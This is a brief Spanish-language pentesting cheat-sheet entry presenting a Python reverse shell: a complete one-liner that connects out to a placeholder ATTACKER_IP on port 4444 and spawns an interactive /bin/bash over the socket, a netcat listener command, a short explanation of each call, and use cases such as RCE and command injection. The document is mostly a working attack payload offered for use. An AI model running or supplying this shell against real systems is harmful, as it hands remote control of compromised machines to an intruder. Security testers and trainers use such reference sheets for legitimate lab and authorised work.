# Python Reverse Shell — Socket

## Descripción

Esta reverse shell utiliza el módulo **socket de Python** para establecer una conexión TCP hacia la máquina atacante y redirigir la entrada y salida del sistema hacia esa conexión.

Es una de las variantes más comunes utilizadas en pentesting y laboratorios de seguridad.

---

# Comando

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

---

# Listener

En la máquina atacante:

```bash
nc -lvnp 4444
```

---

# Requisitos

* Python instalado
* conexión saliente TCP permitida
* shell disponible en el sistema

---

# Explicación

```
socket.socket()        → crea socket TCP
connect()              → conexión al atacante
os.dup2()              → redirige stdin stdout stderr
pty.spawn()            → crea shell interactiva
```

---

# Cuándo usarlo

* explotación de RCE
* command injection
* post-explotación en Linux

---

# Limitaciones

* requiere Python en el sistema
* puede ser detectado por herramientas EDR
